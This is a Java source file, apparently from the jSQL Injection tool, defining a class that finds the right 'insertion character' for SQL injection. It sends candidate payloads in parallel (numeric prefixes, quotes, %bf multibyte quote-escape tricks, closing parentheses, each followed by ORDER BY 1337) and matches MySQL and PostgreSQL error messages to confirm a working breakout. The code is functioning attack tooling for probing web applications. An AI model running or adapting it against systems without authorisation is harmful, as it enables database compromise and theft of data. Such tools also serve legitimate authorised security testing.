package com.jsql.model.suspendable;

import java.util.AbstractMap.SimpleEntry;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Pattern;

import org.apache.commons.lang3.RandomStringUtils;
import org.apache.log4j.Logger;

import com.jsql.model.InjectionModel;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.exception.StoppedByUserSlidingException;
import com.jsql.model.suspendable.callable.CallablePageSource;
import com.jsql.model.suspendable.callable.ThreadFactoryCallable;

/**
 * Runnable class, define insertionCharacter to be used during injection,
 * i.e -1 in "[..].php?id=-1 union select[..]", sometimes it's -1, 0', 0, etc.
 * Find working insertion char when error message occurs in source.
 * Force to 1 if no insertion char works and empty value from user,
 * Force to user's value if no insertion char works,
 * Force to insertion char otherwise.
 */
public class SuspendableGetCharInsertion extends AbstractSuspendable<String> {
	
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getRootLogger();

    public SuspendableGetCharInsertion(InjectionModel injectionModel) {
        super(injectionModel);
    }

    /**
     * 
     */
    @SuppressWarnings("unchecked")
    @Override
    public String run(Object... args) throws JSqlException {
        
        String characterInsertionByUser = (String) args[0];
        SimpleEntry<String, String> parameterToInject = (SimpleEntry<String, String>) args[1];
        boolean isJson = (boolean) args[2];

        // Parallelize the search and let the user stops the process if needed.
        // SQL: force a wrong ORDER BY clause with an inexistent column, order by 1337,
        // and check if a correct error message is sent back by the server:
        //         Unknown column '1337' in 'order clause'
        // or   supplied argument is not a valid MySQL result resource
        ExecutorService taskExecutor = Executors.newCachedThreadPool(new ThreadFactoryCallable("CallableGetInsertionCharacter"));
        CompletionService<CallablePageSource> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);

        List<String> charactersInsertion = new ArrayList<>();
        for (String prefix: new String[]{"-1", "0", "1", ""}) {
            for (String suffix: new String[]{
                "*",
                "*'", "'*'",
                "*\"", "\"*\"",
                "*%bf'", "%bf'*%bf'",
                "*%bf\"", "%bf\"*%bf\""
            }) {
                for (String suffix2: new String[]{"", ")", "))"}) {
                    charactersInsertion.add(suffix.replace("*", prefix) + suffix2);
                }
            }
        }
        
        for (String insertionCharacter: charactersInsertion) {
            taskCompletionService.submit(
                new CallablePageSource(
                    insertionCharacter
                    + " "
                    + this.injectionModel.getVendor().instance().sqlOrderBy(),
                    insertionCharacter,
                    this.injectionModel
                )
            );
        }

        String characterInsertion = null;
        
        int total = charactersInsertion.size();
        while (0 < total) {

            if (this.isSuspended()) {
                throw new StoppedByUserSlidingException();
            }
            
            try {
                CallablePageSource currentCallable = taskCompletionService.take().get();
                total--;
                String pageSource = currentCallable.getContent();
                
                if (
                    // the correct character: mysql
                    Pattern.compile(".*Unknown column '1337' in 'order clause'.*", Pattern.DOTALL).matcher(pageSource).matches() ||
                    Pattern.compile(".*supplied argument is not a valid MySQL result resource.*", Pattern.DOTALL).matcher(pageSource).matches() ||

                    // the correct character: postgresql
                    Pattern.compile(".*ORDER BY position 1337 is not in select list.*", Pattern.DOTALL).matcher(pageSource).matches()
                ) {
                    characterInsertion = currentCallable.getInsertionCharacter();
                    break;
                }
            } catch (InterruptedException | ExecutionException e) {
                LOGGER.error("Interruption while defining character injection", e);
            }
            
        }
        
        if (characterInsertion == null) {
            if ("".equals(characterInsertionByUser) || characterInsertionByUser == null || "*".equals(characterInsertionByUser)) {
                characterInsertion = "1";
            } else {
                characterInsertion = characterInsertionByUser;
            }
            LOGGER.warn("No character insertion activates ORDER BY error, forcing to ["+ characterInsertion.replace(InjectionModel.STAR, "") +"]");
        } else if (!characterInsertionByUser.replace(InjectionModel.STAR, "").equals(characterInsertion)) {
            String characterInsertionByUserFormat = characterInsertionByUser.replace(InjectionModel.STAR, "");
            LOGGER.debug("Found character insertion ["+ characterInsertion +"] in place of ["+ characterInsertionByUserFormat +"] to detect error on ORDER BY");
            LOGGER.trace("Add manually the character * like ["+ characterInsertionByUserFormat +"*] to force the value ["+ characterInsertionByUserFormat +"]");
        }
        
        if (!isJson) {
            characterInsertion = characterInsertion.replace(InjectionModel.STAR, "") + InjectionModel.STAR;
        }
        
        parameterToInject.setValue(characterInsertion);

        // TODO optional
        return characterInsertion;
    }
    
}